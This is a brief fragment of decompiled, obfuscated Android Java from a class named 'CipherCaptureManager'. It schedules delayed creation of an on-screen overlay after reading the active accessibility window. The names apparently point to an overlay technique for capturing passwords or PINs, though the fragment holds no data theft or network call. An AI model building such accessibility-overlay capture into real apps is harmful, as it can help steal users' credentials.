        t60.m214714d6("CipherCaptureManager", "🔷 设置延迟创建覆盖层 (300ms后), id=" + ((Object) str));
        RunnableC0334a0 runnableC0334a0 = this.f53305b9;
        if (runnableC0334a0 != null) {
            this.f53294a8.removeCallbacks(runnableC0334a0);
        }
        RunnableC0334a0 runnableC0334a02 = new RunnableC0334a0(this);
        this.f53305b9 = runnableC0334a02;
        this.f53294a8.postDelayed(runnableC0334a02, 300L);
        rootInActiveWindow.recycle();
    }
}
